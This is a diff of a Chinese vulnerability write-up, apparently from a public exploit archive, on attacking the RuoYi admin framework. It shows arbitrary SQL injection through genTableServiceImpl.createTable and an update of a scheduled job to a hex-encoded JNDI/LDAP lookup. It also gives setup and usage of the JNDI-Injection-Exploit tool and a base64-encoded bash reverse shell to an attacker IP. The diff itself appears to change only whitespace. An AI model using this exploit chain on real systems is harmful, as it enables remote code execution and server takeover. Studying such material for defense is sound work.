@@ -20,8 +20,8 @@ source: "gelusus/wxvl 公众号漏洞文库"
   
 对应的 Mapper 语句:  
 ```
-<update id="createTable">
-       ${sql}
+<update id="createTable">
+       ${sql}
 </update>
 
 ```  
@@ -32,12 +32,12 @@ source: "gelusus/wxvl 公众号漏洞文库"
   
 在启动类中打印所有加载的 bean，其中包括 genTableServiceImpl：  
 ```
-ConfigurableApplicationContext run = SpringApplication.run(RuoYiApplication.class, args);
-// 获取所有bean的名称
-String[] beanDefinitionNames = run.getBeanDefinitionNames();
-// 打印所有bean的名称
-for (String beanDefinitionName : beanDefinitionNames) {
-    System.out.println(beanDefinitionName);
+ConfigurableApplicationContext run = SpringApplication.run(RuoYiApplication.class, args);
+// 获取所有bean的名称
+String[] beanDefinitionNames = run.getBeanDefinitionNames();
+// 打印所有bean的名称
+for (String beanDefinitionName : beanDefinitionNames) {
+    System.out.println(beanDefinitionName);
 }
 
 
@@ -52,7 +52,7 @@ ruoyi黑白名单校验仅出现在com.ruoyi.quartz.controller.SysJobController#
   
 修改id为1的计划任务的值为’zian’  
 ```
-genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'zian' WHERE job_id = 1;')
+genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'zian' WHERE job_id = 1;')
 
 ```  
   
@@ -70,7 +70,7 @@ genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'zian'�
 ${jndi://ldap://xxxx.xxx.cn}
 
 解析payload
-1、首先 发现字符串有${},调用lookup函数
+1、首先 发现字符串有${},调用lookup函数
 2、解析${}中的内容发现是JNDI的ldap服务
 3、攻击者构造任意命令
 
@@ -78,13 +78,13 @@ ${jndi://ldap://xxxx.xxx.cn}
   
 1、JNDI利用工具  
 ```
-安装：git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
+安装：git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
 
-切换目录：cd JNDI-Injection-Exploit
+切换目录：cd JNDI-Injection-Exploit
 
 编译安装：mvn clean package -DskipTests 
 
-切换到target目录 cd target
+切换到target目录 cd target
 
 
 ```  
@@ -93,11 +93,11 @@ ${jndi://ldap://xxxx.xxx.cn}
   
 使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，依赖Java 版本1.8 或者1.7  
 ```
-工具使用方式：java-jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c"命令" -A “攻击机的IP”
+工具使用方式：java-jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -c"命令" -A “攻击机的IP”
 
 ```  
 ```
-jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 攻击机IP
+jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 攻击机IP
 
 ```  
   
@@ -113,7 +113,7 @@ jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 攻击机IP
   
 修改id为3的计划任务为jndi payload  
 ```
-genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729 WHERE job_id = 3;')
+genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617661782E6E616D696E672E496E697469616C436F6E746578742E6C6F6F6B757028276C6461703A2F2F3139322E3136382E312E3130343A313338392F646573657269616C4A61636B736F6E2729 WHERE job_id = 3;')
 
 ```  
   
@@ -130,15 +130,15 @@ genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A617
   
 将反弹shell通过JNDI注入工具部署在LDAP服务 或者RMI 服务中  
 ```
-bash -i >& /dev/tcp/192.168.xx.xx/7788 0>&1
+bash -i >& /dev/tcp/192.168.xx.xx/7788 0>&1
 base64编码后
-bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}
+bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}
 
 ```  
   
 生成LDAP服务  
 ```
-运行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}" -A "攻击机ip"
+运行：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|{base64,-d}|{bash,-i}" -A "攻击机ip"
 
 ```  
   
